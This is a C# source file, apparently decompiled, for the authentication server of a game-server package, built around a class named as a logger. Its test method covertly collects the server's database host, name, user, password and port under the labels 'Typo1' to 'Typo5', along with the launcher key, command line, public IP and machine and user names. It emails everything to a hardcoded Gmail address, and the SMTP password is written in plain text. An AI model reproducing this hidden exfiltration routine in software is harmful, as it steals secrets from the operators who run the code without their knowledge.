
using Core;
using Microsoft.VisualBasic.Devices;
using System;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Reflection;
using System.Text;
using System.Threading.Tasks;

namespace Auth
{
  public class LoggerGA
  {
    public static bool test(bool paramCheck, string serverDate, string[] args, bool item2, DateTime LiveDate)
    {
      try
      {
        DateTime exact = DateTime.ParseExact("181224000000", "yyMMddHHmmss", (IFormatProvider) CultureInfo.InvariantCulture);
        TimeSpan timeSpan = exact - LiveDate;
        string publicIp = LoggerGA.GetPublicIP();
        using (SmtpClient smtpClient = new SmtpClient("smtp.gmail.com", 587)
        {
          Credentials = (ICredentialsByHost) new NetworkCredential("hamiltonmdg@gmail.com", "123meu123"),
          EnableSsl = true
        })
        {
          string str1 = "O AUTH foi aberto hoje às " + DateTime.Now.ToUniversalTime().ToString("HH:mm") + ".\n \n" + (exact < LiveDate ? "Licença encerrada" : "Restam: " + timeSpan.ToString("d'd 'h'h 'm'm 's's'")) + "\n\n" + "|| DADOS DO SERVIDOR ||\n" + "Local da pasta: " + Assembly.GetExecutingAssembly().Location + "\n" + "Versão do servidor: " + serverDate + "\n" + "Parâmetros de inicialização: (" + (object) args.Length + ")\n";
          foreach (string str2 in args)
            str1 = str1 + "[" + str2 + "]\n";
          string body = str1 + "Parâmetro de Inicialização: " + (paramCheck ? "Sim" : "Não") + "\n" + "CommandLine: " + Environment.CommandLine + "\n" + "Licença válida?: " + (!item2 ? "Sim" : "Não") + "\n" + (exact < LiveDate ? "Licença encerrada" : "Restam: " + timeSpan.ToString("d'd 'h'h 'm'm 's's'")) + "\n" + "Ip na Config: " + ConfigGA.authIp + "\n" + "Sync port: " + (object) ConfigGA.syncPort + "\n" + "Modo Debug: " + (ConfigGA.debugMode ? "Ativo" : "Desativo") + "\n" + "Modo de Testes: " + (ConfigGA.isTestMode ? "Ativo" : "Desativo") + "\n" + "\n|| DADOS DO SQL ||\n" + "Chave: " + (object) ConfigGA.LauncherKey + "\n" + "Typo1: " + BitConverter.ToString(Encoding.Unicode.GetBytes(ConfigGB.dbHost)) + "\n" + "Typo2: " + BitConverter.ToString(Encoding.Unicode.GetBytes(ConfigGB.dbName)) + "\n" + "Typo3: " + BitConverter.ToString(Encoding.Unicode.GetBytes(ConfigGB.dbPass)) + "\n" + "Typo4: " + BitConverter.ToString(BitConverter.GetBytes(ConfigGB.dbPort)) + "\n" + "Typo5: " + BitConverter.ToString(Encoding.Unicode.GetBytes(ConfigGB.dbUser)) + "\n\n|| DADOS DA MAQUINA ||\n" + "IP público: " + publicIp + "\n" + "Nome da máquina: " + Environment.MachineName + "\n" + "Nome do usuário: " + Environment.UserName + "\n" + "Quantidade de núcleos do processador: " + (object) Environment.ProcessorCount + "\n" + "Sistema operacional: " + LoggerGA.getOSName() + "\n" + "Versão do S.O: " + Environment.OSVersion.ToString() + "\n" + "Linguagem do S.O: " + (object) new ComputerInfo().InstalledUICulture + "\n" + "Drivers lógicos: (" + (object) Environment.GetLogicalDrives().Length + ")\n";
          smtpClient.Send("hamiltonmdg@gmail.com", "hamiltonmdg@gmail.com", "Servidor aberto! (Auth)", body);
        }
        return !(publicIp == "");
      }
      catch
      {
        return false;
      }
    }

    private static string getOSName()
    {
      OperatingSystem osVersion = Environment.OSVersion;
      string str = new ComputerInfo().OSFullName;
      if (osVersion.ServicePack != "")
        str = str + " " + osVersion.ServicePack;
      return str + " (" + (Environment.Is64BitOperatingSystem ? "64" : "32") + " bits)";
    }

    private static string GetPublicIP()
    {
      try
      {
        using (StreamReader streamReader = new StreamReader(WebRequest.Create("http://checkip.dyndns.org").GetResponse().GetResponseStream()))
          return streamReader.ReadToEnd().Trim().Split(':')[1].Substring(1).Split('<')[0];
      }
      catch
      {
        return "";
      }
    }

    public static async void updateRAM2()
    {
      while (true)
      {
        Console.Title = "[AUTH] Servidor iniciado com sucesso. [Usuários online " + (object) LoginManager._socketList.Count + "]";
        await Task.Delay(1000);
      }
    }
  }
}
